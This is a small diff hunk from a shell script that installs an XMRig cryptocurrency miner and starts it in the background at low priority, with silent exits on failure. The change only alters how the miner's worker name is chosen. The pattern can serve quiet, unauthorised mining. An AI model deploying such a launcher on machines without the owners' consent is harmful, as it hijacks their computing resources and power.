@@ -60,7 +60,7 @@ start_worker()
     mv "$TEMP_XMRIG" "$XMRIG" || exit 0
     rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
 
-    WORKER="worker-$(date +%s)-$$"
+    WORKER="${WORKER:-${HOSTNAME:-worker}}"
     command -v nohup >/dev/null 2>&1 || exit 0
     command -v nice >/dev/null 2>&1 || exit 0
     nohup nice -n 19 "$XMRIG" \
